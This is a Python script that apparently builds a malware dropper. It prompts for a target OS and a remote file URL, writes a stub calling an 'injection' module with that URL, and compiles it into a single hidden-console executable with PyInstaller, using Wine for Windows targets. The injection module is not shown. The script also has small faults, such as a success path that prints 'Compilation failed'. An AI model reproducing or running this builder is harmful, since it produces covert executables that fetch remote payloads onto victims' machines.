#!/usr/bin/env python3
import inquirer
import subprocess
import os

WINDOWS_PYTHON_INTERPRETER_PATH = os.path.expanduser("~/.wine/drive_c/Python27/Scripts/pyinstaller.exe")

def write_injection(file_name, url):
    with open(file_name, "w+") as file:
        file.write("import injection\n")
        file.write("injection.injection('" + url + "')\n")
        import injection
        
def compile_for_windows(file_name):
    subprocess.call(["wine", WINDOWS_PYTHON_INTERPRETER_PATH, "--onefile", "--noconsole", file_name])

def compile_for_linux(file_name):
    subprocess.call(["pyinstaller", "--onefile", "--noconsole", file_name])

def main():
    questions = [
        inquirer.List("operating_sys", message="Select the target OS", choices=[("Linux","linux"),("Windows","windows")] ),
        inquirer.Text("url", message="Enter absolute URL to file", validate=lambda _, x: x != ''),
        inquirer.Text("file_name", message="Enter output filename", validate=lambda _, x: x != '')
        ]
    answers = inquirer.prompt(questions, raise_keyboard_interrupt=True)
    write_injection(answers["file_name"], answers["url"])
    if (answers["operating_sys"] == "windows"):
        compile_for_windows(answers["file_name"])
    if (answers["operating_sys"] == "linux"):
        compile_for_linux(answers["file_name"])
    print("\n[+] Compilation complete.")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("[x] Compiler terminated by user")
    else:
        print("[-] Compilation failed")